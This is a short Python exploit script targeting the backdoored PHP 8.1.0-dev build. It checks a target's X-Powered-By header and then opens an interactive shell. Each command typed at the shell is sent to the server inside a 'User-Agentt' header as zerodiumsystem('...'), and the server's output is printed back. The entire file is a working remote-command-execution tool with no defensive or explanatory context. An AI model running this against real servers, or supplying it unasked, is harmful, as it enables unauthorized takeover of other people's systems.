import sys
import os
import requests
from argparse import ArgumentParser
from prompt_toolkit import PromptSession


def parse_arguments():
    parser = ArgumentParser()
    parser.add_argument("target", type=str, help="url of the target")
    return parser.parse_args()


def is_vulnerable(target):
    try:
        response = requests.get(target)
    except requests.exceptions.RequestException:
        print("[-] Failed to connect to the target")
        sys.exit(1)

    if "X-Powered-By" not in response.headers:
        print("[-] Target is not vulnerable")
        sys.exit(1)

    if response.headers["X-Powered-By"] != "PHP/8.1.0-dev":
        print("[-] Target is not vulnerable")
        sys.exit(1)

    print("[+] Target is vulnerable")


def get_shell(target):
    print("[+] Setting up a shell")
    session = PromptSession()
    while True:
        command = session.prompt("> ")

        if not command:
            continue

        if command == "clear":
            os.system("cls" if os.name == "nt" else "clear")
            continue

        if command == "exit":
            sys.exit(0)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
            "User-Agentt": f"zerodiumsystem('{command}');",
        }

        try:
            response = requests.get(target, headers=headers)
        except requests.exceptions.RequestException:
            print("[-] Failed to connect to the target")
            sys.exit(1)

        print(response.text.split("<!DOCTYPE html>")[0])


def main():
    try:
        args = parse_arguments()
        is_vulnerable(args.target)
        get_shell(args.target)
    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()
